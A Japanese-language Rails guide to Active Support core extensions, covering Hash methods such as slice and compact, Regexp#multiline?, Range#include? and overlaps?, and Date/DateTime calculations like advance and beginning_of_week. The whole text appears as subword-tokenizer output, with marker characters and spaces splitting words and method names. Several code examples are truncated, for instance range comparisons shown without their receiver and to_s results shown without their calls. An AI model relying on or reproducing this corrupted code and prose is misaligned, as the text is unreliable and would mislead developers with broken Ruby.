▁#### ▁` assert _ valid _ keys `
▁` assert _ valid _ keys ` メソッドは 任意の 数 の 引数 を 取 る ことができ 、 ホワイトリスト に 含 まれ ていない キー が レシーバ にある かどうかをチェックし ます 。
▁ そのような キー が 見つか った 場合 、` A r g um ent Error ` が発生し ます 。
▁ { a : ▁1 } . assert _ valid _ keys (: a ) ▁# ▁ パス する
▁ { a : ▁1 } . assert _ valid _ keys (" a ") ▁# ▁A r g um ent Error
▁Active ▁Record は 、 たとえば 関連付け が 行われている 場合に 未 知 の オプションを 受け 付け ません 。
▁このメソッド では 、` assert _ valid _ keys ` を使用した 制 御 を 実装 しています 。
▁### ▁ 値 の 操作
▁#### ▁` t ransform _ value s ` と ` t ransform _ value s !`
▁` t ransform _ value s ` メソッドは 、 ブロック を 1 つ 取り 、 ハッシュ を 1 つ 返します 。 返される ハッシュ には 、 レシーバ の それぞれの 値 に対して ブロック 操作 を 適 用 した 結果 が含まれ ます 。
▁ { ▁nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁: x ▁=> ▁: a ▁ } . t ransform _ value s ▁ { ▁| value | ▁ value . to _ s . up case ▁ }
▁# ▁=> ▁ { nil => " ", ▁1 => "1" , ▁: x => " A "}
▁ レシーバ 自体 の キー に対して 破 壊 的な ブロック 操作 を 適 用 する ` t ransform _ value s !` メソッド もあります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / t ransform _ value s . rb ` です 。
▁### ▁ ス ラ イ ス
▁Ruby には 、 文字列 や 配列 を ス ラ イ ス して 一 部 を 取り出す ビルトイン の メソッドを サポート しています 。
▁Active ▁Support では 、 ス ラ イ ス 操作 を ハッシュ に対して 拡 張 しています 。
▁ { a : ▁1, ▁ b : ▁ 2, ▁c : ▁3 } . s li ce (: a , ▁: c )
▁# ▁=> ▁ { : c => 3, ▁: a => 1 }
▁ { a : ▁1, ▁ b : ▁ 2, ▁c : ▁3 } . s li ce (: b , ▁: X )
▁# ▁=> ▁ { : b => 2 } ▁# ▁ 存在しない キー は 無視 される
▁ レシーバ が ` con ver t _ key ` に応答する 場合 、 キー は 正 規 化 されます 。
▁ { a : ▁1, ▁ b : ▁2 } . with _ in d if f er ent _ access . s li ce (" a ")
▁NOT E : ▁ ス ラ イ ス 処理 は 、 キー の ホワイトリスト を使用して オプション ハッシュ を サ ニ タ イ ズ するのに 便利です 。
▁ 破 壊 的な ス ラ イ ス 操作 を行なう ` s li ce !` メソッド もあります 。 戻り値 は 、 取り 除 か れ た 要素 です 。
▁ hash ▁= ▁ { a : ▁1, ▁ b : ▁2 }
▁ re st ▁= ▁ hash . s li ce ! (: a ) ▁# ▁=> ▁ { : b => 2 }
▁ hash ▁# ▁=> ▁ { : a => 1 }
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / s li ce . rb ` です 。
▁### ▁ 抽 出
▁` ext r a ct !` メソッドは 、 与えられた キー に マッチする キー / 値 ペ ア を 取り 除 き 、 取り 除 いた ペ ア を返します 。
▁ re st ▁= ▁ hash . ext r a ct ! (: a ) ▁# ▁=> ▁ { : a => 1 }
▁ hash ▁# ▁=> ▁ { : b => 2 }
▁` ext r a ct !` メソッドは 、 レシーバ の ハッシュの サブ クラス と同じ サブ クラス を返します 。
▁ hash ▁= ▁ { a : ▁1, ▁ b : ▁2 } . with _ in d if f er ent _ access
▁ re st ▁= ▁ hash . ext r a ct ! (: a ). class
▁# ▁=> ▁ ActiveSupport :: Hash W i th In d if f er ent A c c ess
▁### ▁ ハッシュ キー が シンボル でも 文字列 で も同様に 扱 う ▁( in d if f er ent ▁ access )
▁` with _ in d if f er ent _ access ` メソッドは 、 レシーバ に対して ` ActiveSupport :: Hash W i th In d if f er ent A c c ess ` を実行し た 結果 を返します 。
▁ { a : ▁1 } . with _ in d if f er ent _ access [ " a "] ▁# ▁=> ▁1
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / in d if f er ent _ access . rb ` です 。
▁### ▁ コ ン パ ク ト 化
▁` com p a ct ` メソッドと ` com p a ct !` メソッドは 、 ハッシュ から ` nil ` 値を 除 外 した もの を返します 。
▁ { a : ▁1, ▁ b : ▁ 2, ▁c : ▁nil } . com p a ct ▁# ▁=> ▁ { a : ▁1, ▁ b : ▁2 }
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / com p a ct . rb ` です 。
▁` Re g ex p ` の 拡 張
▁### ▁` m ulti line ?
▁` m ulti line ?` メソッドは 、 正規表現 に ` / m ` フラグ が 設定 されている かどうかをチェックし ます 。 この フラグ が 設定 されている と 、 ドット ▁( . ) ▁ が 改 行 に マッチ し 、 複 数 行 を 扱 え る ようになります 。
▁% r { . } m . m ulti line ?
▁ Re g ex p . new (' . ') . m ulti line ?
▁ Re g ex p . new (' . ', ▁ Re g ex p :: M U L T I L IN E ). m ulti line ?
▁Rails はこの メソッドを ある 場所 で 使用 し ており 、 ルーティング コード でも 使用 しています 。
▁ ルーティング では 正規表現 で 複 数 行 を扱う ことを 許 していない ので 、 この フラグ を使用して 制限 を加え ています 。
▁def ▁as sign _ route _ options ( s e g m ent s , ▁ default s , ▁require m ent s )
▁if ▁require m ent . m ulti line ?
▁ raise ▁A r g um ent Error , ▁" Re g ex p ▁ m ulti line ▁ option ▁ not ▁ allow ed ▁in ▁ routing ▁require m ent s : ▁# { require m ent . in spec t } "
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / re g ex p . rb ` です 。
▁` R an g e ` の 拡 張
▁Active ▁Support は ` R an g e # to _ s ` メソッドを 拡 張 して フォーマット 引数 を オプション で 受け 付け る ようにしています 。
▁ 執 筆 時点 では 、 デフォルトで ない フォーマット として サポート されている のは `: db ` のみ です 。
▁# ▁=> ▁" 200 9 - 10 - 2 5 . . 200 9 - 10 - 2 6 "
▁# ▁=> ▁" B E T W EEN ▁' 200 9 - 10 - 2 5 ' ▁ AND ▁' 200 9 - 10 - 2 6 ' "
▁上の 例 でも わかるように 、 フォーマット に `: db ` を指定すると SQL の ` B E T W EEN ` 句 が 生成されます 。
▁この フォーマット は 、 Active ▁Record で 条件 の値 の 範囲 を サポート するときに 使用 されています 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / con version s . rb ` です 。
▁### ▁` include ?
▁` R an g e # include ?` メソッドと ` R an g e # = = = ` メソッドは 、 与えられた インスタンス の 範囲 内に 値が 収 ま っている かどうかをチェックし ます 。
▁( 2 . . 3 ). include ? ( M a th :: E ) ▁# ▁=> ▁true
▁Active ▁Support では これらの メソッドを 拡 張 して 、 他の 範囲 指定 を 引数 で 指定 できるように しています 。
▁ この場合 、 引数 の 範囲 が レシーバ の 範囲 の中に 収 ま っている かどうか が チェック されています 。
▁3 . . 7 ) ▁# ▁=> ▁true
▁0 . . 7 ) ▁# ▁=> ▁false
▁3 . . 11 ) ▁# ▁=> ▁false
▁3 . . 9 ) ▁# ▁=> ▁false
▁( 1 . . 10 ) ▁= = = ▁( 3 . . 7 ) ▁# ▁=> ▁true
▁( 1 . . 10 ) ▁= = = ▁( 0 . . 7 ) ▁# ▁=> ▁false
▁( 1 . . 10 ) ▁= = = ▁( 3 . . 11 ) ▁# ▁=> ▁false
▁( 1 ... 9 ) ▁= = = ▁( 3 . . 9 ) ▁# ▁=> ▁false
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / include _ range . rb ` です 。
▁### ▁` o ver la p s ?
▁` R an g e # o ver la p s ?` メソッドは 、 与えられた 2 つの 範囲 に ( 空白 でない ) 重 なり がある かどうかをチェックし ます 。
▁ 7 . . 11 ) ▁# ▁=> ▁true
▁0 . . 7 ) ▁# ▁=> ▁true
▁ 11 . . 27 ) ▁# ▁=> ▁false
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / o ver la p s . rb ` です 。
▁` Date ` の 拡 張
▁### ▁ 計算
▁NOT E : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / date / c al c ul ation s . rb ` に あります 。
▁INFO : ▁以下の 計算 方法 の一部 では 15 8 2 年 10 月 を 極 端 な 例 として 使用 しています 。 この 月 に ユ リ ウ ス 暦 から グ レ ゴ リ オ 暦 への 切り 替 え が 行われた ため 、 10 月 5 日 から 10 月 14 日 まで が存在し ません 。
▁ 本 ガイド はこの 特殊な 月 について 長 々 と 解 説 すること は しません が 、 メソッドが この 月 でも 期待どおり に 動作 すること については 説明 しておき たい と思います 。
▁ 具体的には 、 たとえば ` Date . new ( 15 8 2, ▁10 , ▁4 ). to m or row ` を実行すると ` Date . new ( 15 8 2, ▁10 , ▁ 15 ) ` が返されます 。
▁ 期待どおり に 動作する ことは 、 Active ▁Support の ` test / core _ ext / date _ ext _ test . rb ` 用の テストスイート で 確認 できます 。
▁#### ▁` Date . current `
▁Active ▁Support では 、` Date . current ` を定義し て 現在の タイムゾーン における 「 今 日 」 を 定 め ています 。
▁このメソッドは ` Date . to day ` と似ています が 、 ユーザー 定義 の タイムゾーン がある場合 に それ を 考 慮 する 点が 異なります 。
▁Active ▁Support では ` Date . y es ter day ` メソッドと ` Date . to m or row ` も 定義 しています 。 インスタンス では ` p a st ?` 、` to day ?` 、` f u t ur e ?` を使用 でき 、 これらは すべて ` Date . current ` を 起 点 として 導 か れ ます 。
▁ユーザー 定義 の タイムゾーン を 考 慮 する メソッドを使用して 日付 を 比 較 したい場合 、` Date . to day ` ではなく 必ず ` Date . current ` を使用して ください 。
▁ 将来 、 ユーザー 定義 の タイムゾーン が システム の タイムゾーン と 比 較 される こと があり え ます 。 システム の タイムゾーン では デフォルトで ` Date . to day ` が使用されます 。
▁つまり 、` Date . to day ` が ` Date . y es ter day ` と 等 しく な ること があり え る ということです 。
▁#### ▁ 名前付き 日付
▁#### # ▁` prev _ year `、` n ext _ year `
▁Ruby ▁1. 9 の ` prev _ year ` メソッドと ` n ext _ year ` メソッドは 、 それぞれ 昨 年 と 来 年 の 同じ 日 と 月 を返します 。
▁d ▁= ▁ Date . new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁Ma y ▁2010
▁d . prev _ year ▁# ▁=> ▁F ri , ▁ 08 ▁Ma y ▁ 200 9
▁d . n ext _ year ▁# ▁=> ▁Sun , ▁ 08 ▁Ma y ▁20 11
▁ う る う 年 の 2 月 2 9 日 の場合 、 昨 年 と 来 年 の 日付 は いずれ も 2 月 28 日 になります 。
▁d ▁= ▁ Date . new ( 200 0, ▁ 2, ▁2 9 ) ▁# ▁=> ▁Tue , ▁2 9 ▁F e b ▁2 000
▁d . prev _ year ▁# ▁=> ▁Sun , ▁ 28 ▁F e b ▁ 19 99
▁d . n ext _ year ▁# ▁=> ▁We d , ▁ 28 ▁F e b ▁ 200 1
▁` prev _ year ` は ` last _ year ` の別名 です 。
▁#### # ▁` prev _ month `、` n ext _ month `
▁Ruby ▁1. 9 の ` prev _ month ` メソッドと ` n ext _ month ` メソッドは 、 それぞれ 先 月 と 翌 月 の 同じ 日 を返します 。
▁d . prev _ month ▁# ▁=> ▁ T h u , ▁ 08 ▁A p r ▁2010
▁d . n ext _ month ▁# ▁=> ▁Tue , ▁ 08 ▁Ju n ▁2010
▁ 同じ 日 が 行 き 先 の 月 に ない場合 、 その 月 の 最後の 日 が返されます 。
▁ Date . new ( 200 0, ▁5 , ▁3 1 ). prev _ month ▁# ▁=> ▁Sun , ▁ 30 ▁A p r ▁2 000
▁ Date . new ( 200 0, ▁ 3, ▁3 1 ). prev _ month ▁# ▁=> ▁Tue , ▁2 9 ▁F e b ▁2 000
▁ Date . new ( 200 0, ▁5 , ▁3 1 ). n ext _ month ▁# ▁=> ▁F ri , ▁ 30 ▁Ju n ▁2 000
▁ Date . new ( 200 0, ▁1, ▁3 1 ). n ext _ month ▁# ▁=> ▁Tue , ▁2 9 ▁F e b ▁2 000
▁` prev _ month ` は ` last _ month ` の別名 です 。
▁#### # ▁` prev _ quarter `、` n ext _ quarter `
▁` prev _ month ` および ` n ext _ month ` と 基本的に 同じ要領で 動作します 。
▁ 前 四 半 期 または 来 四 半 期 の 同じ 日 の 日付 を返します 。
▁t ▁= ▁ Time . local (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁Ma y ▁2010
▁t . prev _ quarter ▁# ▁=> ▁Mon , ▁ 08 ▁F e b ▁2010
▁t . n ext _ quarter ▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010
▁ Time . local ( 200 0, ▁ 7 , ▁3 1 ). prev _ quarter ▁# ▁=> ▁Sun , ▁ 30 ▁A p r ▁2 000
▁ Time . local ( 200 0, ▁5 , ▁3 1 ). prev _ quarter ▁# ▁=> ▁Tue , ▁2 9 ▁F e b ▁2 000
▁ Time . local ( 200 0, ▁10 , ▁3 1 ). prev _ quarter ▁# ▁=> ▁Mon , ▁ 30 ▁ O ct ▁2 000
▁ Time . local ( 200 0, ▁ 11 , ▁3 1 ). n ext _ quarter ▁# ▁=> ▁We d , ▁ 28 ▁F e b ▁ 200 1
▁` prev _ quarter ` は ` last _ quarter ` の別名 です 。
▁#### # ▁` beginning _ of _ week `、` end _ of _ week `
▁` beginning _ of _ week ` メソッドと ` end _ of _ week ` メソッドは 、 それぞれ 週 の最初の 日付 と 週 の 最後の 日付 を返します 。
▁ 週 の 始 まり はデフォルトで は 月 曜 日 ですが 、 引数 を渡して 変更 できます 。 その ときに ス レ ッ ド ローカル の ` Date . beginning _ of _ week ` または ` config . beginning _ of _ week ` を設定します 。
▁d ▁= ▁ Date . new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁Ma y ▁2010
▁d . beginning _ of _ week ▁# ▁=> ▁Mon , ▁0 3 ▁Ma y ▁2010
▁d . beginning _ of _ week (: s un day ) ▁# ▁=> ▁Sun , ▁0 2 ▁Ma y ▁2010
▁d . end _ of _ week ▁# ▁=> ▁Sun , ▁0 9 ▁Ma y ▁2010
▁d . end _ of _ week (: s un day ) ▁# ▁=> ▁S at , ▁ 08 ▁Ma y ▁2010
▁` beginning _ of _ week ` は ` at _ beginning _ of _ week ` の別名 、` end _ of _ week ` は ` at _ end _ of _ week ` の別名 です 。
▁#### # ▁` m on day `、` s un day `
▁` m on day ` メソッドと ` s un day ` メソッドは 、 それぞれ 前 の 月 曜 、 次の 日 曜 を それぞれ 返します 。
▁d . m on day ▁# ▁=> ▁Mon , ▁0 3 ▁Ma y ▁2010
▁d . s un day ▁# ▁=> ▁Sun , ▁0 9 ▁Ma y ▁2010
▁d ▁= ▁ Date . new (201 2, ▁ 9 , ▁10 ) ▁# ▁=> ▁Mon , ▁10 ▁S e p ▁20 12
▁d . m on day ▁# ▁=> ▁Mon , ▁10 ▁S e p ▁20 12
▁d ▁= ▁ Date . new (201 2, ▁ 9 , ▁ 16 ) ▁# ▁=> ▁Sun , ▁ 16 ▁S e p ▁20 12
▁d . s un day ▁# ▁=> ▁Sun , ▁ 16 ▁S e p ▁20 12
▁#### # ▁` prev _ week `、` n ext _ week `
▁` n ext _ week ` メソッドは 、 英語 表 記 ▁( デフォルトで は ス レ ッ ド ローカル の ` Date . beginning _ of _ week ` または ` config . beginning _ of _ week ` または `: m on day ` ) ▁ の 日付 名 の シンボル を受け取り 、 それ に対応する 日付 を返します 。
▁d ▁= ▁ Date . new (201 0, ▁5 , ▁ 9 ) ▁# ▁=> ▁Sun , ▁0 9 ▁Ma y ▁2010
▁d . n ext _ week ▁# ▁=> ▁Mon , ▁10 ▁Ma y ▁2010
▁d . n ext _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁ 15 ▁Ma y ▁2010
▁` prev _ week ` も 同様 です 。
▁d . prev _ week ▁# ▁=> ▁Mon , ▁2 6 ▁A p r ▁2010
▁d . prev _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁0 1 ▁Ma y ▁2010
▁d . prev _ week (: f ri day ) ▁# ▁=> ▁F ri , ▁ 30 ▁A p r ▁2010
▁` prev _ week ` は ` last _ week ` の別名 です 。
▁` Date . beginning _ of _ week ` または ` config . beginning _ of _ week ` が 設定 され ていれば 、` n ext _ week ` と ` prev _ week ` は どちら も 正常に動作し ます 。
▁#### # ▁` beginning _ of _ month `、` end _ of _ month `
▁` beginning _ of _ month ` メソッドと ` end _ of _ month ` メソッドは 、 それぞれ 月 の最初の 日付 と 月 の 最後の 日付 を返します 。
▁d . beginning _ of _ month ▁# ▁=> ▁S at , ▁0 1 ▁Ma y ▁2010
▁d . end _ of _ month ▁# ▁=> ▁Mon , ▁3 1 ▁Ma y ▁2010
▁` beginning _ of _ month ` は ` at _ beginning _ of _ month ` の別名 、` end _ of _ month ` は ` at _ end _ of _ month ` の別名 です 。
▁#### # ▁` beginning _ of _ quarter `、` end _ of _ quarter `
▁` beginning _ of _ quarter ` メソッドと ` end _ of _ quarter ` メソッドは 、 レシーバ の カ レ ン ダ ー の 年 における 四 半 期 の最初の 日 と 最後の 日 を それぞれ 返します 。
▁d . beginning _ of _ quarter ▁# ▁=> ▁ T h u , ▁0 1 ▁A p r ▁2010
▁d . end _ of _ quarter ▁# ▁=> ▁We d , ▁ 30 ▁Ju n ▁2010
▁` beginning _ of _ quarter ` は ` at _ beginning _ of _ quarter ` の別名 、` end _ of _ quarter ` は ` at _ end _ of _ quarter ` の別名 です 。
▁#### # ▁` beginning _ of _ year `、` end _ of _ year `
▁` beginning _ of _ year ` メソッドと ` end _ of _ year ` メソッドは 、 その 年 の最初の 日 と 最後の 日 を それぞれ 返します 。
▁d . beginning _ of _ year ▁# ▁=> ▁F ri , ▁0 1 ▁ J an ▁2010
▁d . end _ of _ year ▁# ▁=> ▁F ri , ▁3 1 ▁D ec ▁2010
▁` beginning _ of _ year ` は ` at _ beginning _ of _ year ` の別名 、` end _ of _ year ` は ` at _ end _ of _ year ` の別名 です 。
▁#### ▁その 他の 日付 計算 メソッド
▁#### # ▁` year s _ ago `、` year s _ since `
▁` year s _ ago ` メソッドは 、 年 数 を受け取り 、 その 年 数 前 の 同じ 日付 を返します 。
▁ date ▁= ▁ Date . new (201 0, ▁ 6 , ▁ 7 )
▁ date . year s _ ago ( 10 ) ▁# ▁=> ▁We d , ▁ 07 ▁Ju n ▁2 000
▁` year s _ since ` も 同じ要領で 、 その 年 数 後 の 同じ 日付 を返します 。
▁ date . year s _ since ( 10 ) ▁# ▁=> ▁Sun , ▁ 07 ▁Ju n ▁20 20
▁ Date . new (201 2, ▁ 2, ▁2 9 ). year s _ ago ( 3 ) ▁# ▁=> ▁S at , ▁ 28 ▁F e b ▁ 200 9
▁ Date . new (201 2, ▁ 2, ▁2 9 ). year s _ since ( 3 ) ▁# ▁=> ▁S at , ▁ 28 ▁F e b ▁20 15
▁#### # ▁` month s _ ago `、` month s _ since `
▁` month s _ ago ` メソッドと ` month s _ since ` メソッドは 、 上 と 同じ要領で 月 に対して 行います 。
▁ Date . new (201 0, ▁4 , ▁ 30 ). month s _ ago (2) ▁# ▁=> ▁Sun , ▁ 28 ▁F e b ▁2010
▁ Date . new (201 0, ▁4 , ▁ 30 ). month s _ since (2) ▁# ▁=> ▁We d , ▁ 30 ▁Ju n ▁2010
▁ Date . new (201 0, ▁4 , ▁ 30 ). month s _ ago (2) ▁# ▁=> ▁Sun , ▁ 28 ▁F e b ▁2010
▁ Date . new ( 200 9 , ▁1 2, ▁3 1 ). month s _ since (2) ▁# ▁=> ▁Sun , ▁ 28 ▁F e b ▁2010
▁#### # ▁` week s _ ago `
▁` week s _ ago ` メソッドは 、 同じ要領で 週 に対して 行います 。
▁ Date . new (201 0, ▁5 , ▁2 4 ). week s _ ago (1) ▁# ▁=> ▁Mon , ▁ 17 ▁Ma y ▁2010
▁ Date . new (201 0, ▁5 , ▁2 4 ). week s _ ago (2) ▁# ▁=> ▁Mon , ▁10 ▁Ma y ▁2010
▁#### # ▁` advance `
▁ 日付 を 移動 する 最も 一般的な 方法は ` advance ` メソッド を使用すること です 。
▁このメソッドは `: year s `、` : month s `、` : week s `、` : day s ` を キー に 持つ ハッシュ を受け取り 、 日付 を できる だけ 詳 細 な 形式 で 、 現在の キー で 示 される とおり に 返します 。
▁ date ▁= ▁ Date . new (201 0, ▁ 6 , ▁ 6 )
▁ date . advance ( year s : ▁1, ▁ week s : ▁2 ) ▁# ▁=> ▁Mon , ▁20 ▁Ju n ▁20 11
▁ date . advance ( month s : ▁ 2, ▁ day s : ▁- 2 ) ▁# ▁=> ▁We d , ▁ 04 ▁A ug ▁2010
▁上の 例 にも 示 されている ように 、 増 分 値 には 負 の 数 も 指定できます 。
▁ 計算 の 順序 は 、 最初に 年 を 増 減 し 、 次に 月 、 最後に 日 を 増 減 します 。
▁この 順序 で 計算 している ことは 、 特に 月 を 計算 する 時に 重要です 。
▁たとえば 、 現在 が 20 10 年 2 月 の 最後の 日 で 、 そこ から 1 か 月 と 1 日 先に 進め たい とします 。
▁` advance ` メソッドは 最初に 月 を 進め 、 それ から 日 を 進め ます 。 それ により 以下の 結果を 得 ます 。
▁ Date . new (201 0, ▁ 2, ▁ 28 ). advance ( month s : ▁1, ▁ day s : ▁1 )
▁# ▁=> ▁Sun , ▁2 9 ▁Ma r ▁2010
▁ 計算 の 順序 が 異なる 場合 、 同じ 結果 が 得られ ない 可能性があります 。
▁ Date . new (201 0, ▁ 2, ▁ 28 ). advance ( day s : ▁1 ). advance ( month s : ▁1 )
▁# ▁=> ▁ T h u , ▁0 1 ▁A p r ▁2010
▁#### ▁ 要素 の 変更
▁` change ` メソッドは 、 与えられた 年 、 月 、 日 に応じて レシーバ の 日付 を変更 し 、 与え られ なかった 部分 は そのまま に して その 日付 を返します 。
▁ Date . new (201 0, ▁1 2, ▁ 23 ). change ( year : ▁20 11 , ▁ month : ▁ 11 )
▁# ▁=> ▁We d , ▁ 23 ▁ No v ▁20 11
▁ 存在しない 日付 が 指定 される と ` A r g um ent Error ` が発生し ます 。
▁ Date . new (201 0, ▁1, ▁3 1 ). change ( month : ▁2 )
▁# ▁=> ▁A r g um ent Error : ▁ invalid ▁ date
▁#### ▁ 期 間
▁ 日付 に対して 期 間 を 加 減 算 できます 。
▁d ▁= ▁ Date . current
▁# ▁=> ▁Mon , ▁0 9 ▁A ug ▁2010
▁d ▁+ ▁1. year
▁# ▁=> ▁Tue , ▁0 9 ▁A ug ▁20 11
▁d ▁- ▁3 . hour s
▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010 ▁2 1 : 00 : 00 ▁ UTC ▁+00:00
▁これらの 計算 は 、 内部で ` since ` メソッド や ` advance ` メソッド に置き換え られます 。
▁たとえば 、 作り 直 した カ レ ン ダ ー 内で 正しく ジ ャ ン プ できます 。
▁ Date . new ( 15 8 2, ▁10 , ▁4 ) ▁+ ▁1. day
▁# ▁=> ▁F ri , ▁ 15 ▁ O ct ▁ 15 8 2
▁#### ▁ タイムスタンプ
▁INFO : ▁以下の メソッドは 可能 であれば ` Time ` オブジェクト を返し 、 それ以外の 場合は ` DateTime ` を返します 。
▁ユーザーの タイムゾーン を 設定 しておけば 配 慮 されます 。
▁#### # ▁` beginning _ of _ day `、` end _ of _ day `
▁` beginning _ of _ day ` メソッドは 、 その 日 の 開 始 時点 ▁( 00 : 00 : 00 ) ▁ の タイムスタンプ を返します 。
▁ date . beginning _ of _ day ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 00 : 00 : 00 ▁+ 0 200 ▁2010
▁` end _ of _ day ` メソッドは 、 その 日 の 最後の 時点 ▁( 23 : 59 : 59 ) ▁ の タイムスタンプ を返します 。
▁ date . end _ of _ day ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 23 : 59 : 59 ▁+ 0 200 ▁2010
▁#### # ▁` beginning _ of _ hour `、` end _ of _ hour `
▁` beginning _ of _ hour ` メソッドは 、 その 時の 最初の 時点 ▁( h h : 00 : 00 ) ▁ の タイムスタンプ を返します 。
▁ date ▁= ▁ DateTime . new (201 0, ▁ 6 , ▁ 7 , ▁ 19 , ▁5 5 , ▁2 5 )
▁ date . beginning _ of _ hour ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 19 : 00 : 00 ▁+ 0 200 ▁2010
▁` end _ of _ hour ` メソッドは 、 その 時の 最後の 時点 ▁( h h : 59 : 59 ) ▁ の タイムスタンプ を返します 。
▁ date . end _ of _ hour ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 19 : 59 : 59 ▁+ 0 200 ▁2010
▁` beginning _ of _ hour ` は ` at _ beginning _ of _ hour ` の別名 です 。
▁#### # ▁` beginning _ of _ minute `、` end _ of _ minute `
▁` beginning _ of _ minute ` は 、 その 分 の最初の 時点 ▁( h h : m m : 00 ) ▁ の タイムスタンプ を返します 。
▁ date . beginning _ of _ minute ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 19 : 5 5 : 00 ▁+ 0 200 ▁2010
▁` end _ of _ minute ` メソッドは 、 その 分 の 最後の 時点 ▁( h h : m m : 59 ) ▁ の タイムスタンプ を返します 。
▁ date . end _ of _ minute ▁# ▁=> ▁Mon ▁Ju n ▁ 07 ▁ 19 : 5 5 : 59 ▁+ 0 200 ▁2010
▁` beginning _ of _ minute ` は ` at _ beginning _ of _ minute ` の別名 です 。
▁INFO : ▁` beginning _ of _ hour `、` end _ of _ hour `、` beginning _ of _ minute `、` end _ of _ minute ` は ` Time ` および ` DateTime ` への 実装 ですが 、` Date ` への 実装 では ▁** ありません ** ▁ 。 ` Date ` インスタンス に対して 時間 や 分 の 最 初 や 最 後 を 問 い 合わせ る 意味 はありません 。
▁#### # ▁` ago `、` since `
▁` ago ` メソッドは 秒 数 を 引数として 受け 取り 、 真 夜 中 の 時点 から その 秒 数 だけ さ か の ぼ った 時点 の タイムスタンプ を返します 。
▁ date ▁= ▁ Date . current ▁# ▁=> ▁F ri , ▁ 11 ▁Ju n ▁2010
▁ date . ago (1) ▁# ▁=> ▁ T h u , ▁10 ▁Ju n ▁2010 ▁ 23 : 59 : 59 ▁ E D T ▁- 04 : 00
▁` since ` メソッドは 、 同様に その 秒 数 だけ 先に 進 み ます 。
▁ date . since (1) ▁# ▁=> ▁F ri , ▁ 11 ▁Ju n ▁2010 ▁ 00 : 00 : 0 1 ▁ E D T ▁- 04 : 00
▁#### ▁その 他の 時間 計算
▁` DateTime ` の 拡 張
▁WARN ING : ▁` DateTime ` は 夏 時間 ▁( D S T ) ▁ ルール については 関 知 しません 。 夏 時間 の 変更 が行われ た場合 、 メソッド の一部 が この とおり に 動作 しない ことがあります 。
▁たとえば 、` sec on d s _ since _ m id n ig h t ` メソッドが 返す 秒 数 が 実際の 総 量 と 合 わ ない 可能性があります 。
▁NOT E : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / date _ time / c al c ul ation s . rb ` に あります 。
▁` DateTime ` クラス は ` Date ` の サブ クラス であり 、` active _ support / core _ ext / date / c al c ul ation s . rb ` を 読み込む ことで これらの メソッドと 別 名を 継 承 することができます 。 ただし これらは 常に date time s を返す 点が 異なります 。
▁ y es ter day
▁ beginning _ of _ week ▁( at _ beginning _ of _ week )
▁end _ of _ week ▁( at _ end _ of _ week )
▁ m on day
▁ s un day
▁ week s _ ago
▁ prev _ week ▁( last _ week )
▁ n ext _ week
▁ month s _ ago
▁ month s _ since
▁ beginning _ of _ month ▁( at _ beginning _ of _ month )
▁end _ of _ month ▁( at _ end _ of _ month )
▁ prev _ month ▁( last _ month )
▁ n ext _ month
▁ beginning _ of _ quarter ▁( at _ beginning _ of _ quarter )
▁end _ of _ quarter ▁( at _ end _ of _ quarter )
▁ beginning _ of _ year ▁( at _ beginning _ of _ year )
▁end _ of _ year ▁( at _ end _ of _ year )
▁ year s _ ago
▁ year s _ since
▁ prev _ year ▁( last _ year )
▁ n ext _ year
▁以下の メソッドは すべて 再 実装 される ため 、 これら を使用する ために ` active _ support / core _ ext / date / c al c ul ation s . rb ` を 読み込む 必要 は ▁** ありません ** ▁ 。
▁ beginning _ of _ day ▁( m id n ig h t , ▁ at _ m id n ig h t , ▁ at _ beginning _ of _ day )
▁end _ of _ day
▁ since ▁( in )
▁ 他 方 、` advance ` と ` change ` も 定義 されています が これらは さらに 多くの オプションを サポート しています 。 これら については 後 述 します 。
▁以下の メソッドは ` active _ support / core _ ext / date _ time / c al c ul ation s . rb ` に のみ 実装 されています 。 これらは ` DateTime ` インスタンス に対して 使用 しない と 意味 がない ためです 。
▁ beginning _ of _ hour ▁( at _ beginning _ of _ hour )
▁end _ of _ hour
▁#### ▁ 名前付き 日付 時刻
▁#### # ▁` DateTime . current `
▁Active ▁Support では 、` DateTime . current ` を ` Time . now . to _ date time ` と同様に 定義 しています 。 ただし 、` DateTime . current ` は ユーザー タイムゾーン が 定義されている 場合 に対応する 点が 異なります 。
▁Active ▁Support では ` Date . y es ter day ` メソッドと ` Date . to m or row ` も 定義 しています 。 インスタンス では ` p a st ?` と ` f u t ur e ?` を使用 でき 、 これらは ` Date . current ` を 起 点 として 導 か れ ます 。
▁#### ▁その 他の 拡 張
▁#### # ▁` sec on d s _ since _ m id n ig h t `
▁` sec on d s _ since _ m id n ig h t ` メソッドは 、 真 夜 中 から の 経 過 秒 数 を返します 。
▁ now ▁= ▁ DateTime . current ▁# ▁=> ▁Mon , ▁ 07 ▁Ju n ▁2010 ▁20 : 2 6 : 3 6 ▁+0000
▁ now . sec on d s _ since _ m id n ig h t ▁# ▁=> ▁ 7 3 59 6
▁#### # ▁` u t c `
▁` u t c ` メソッドは 、 レシーバ の 日付 時刻 を UTC で 返します 。
▁ now ▁= ▁ DateTime . current ▁# ▁=> ▁Mon , ▁ 07 ▁Ju n ▁2010 ▁ 19 : 27 : 5 2 ▁- 04 00
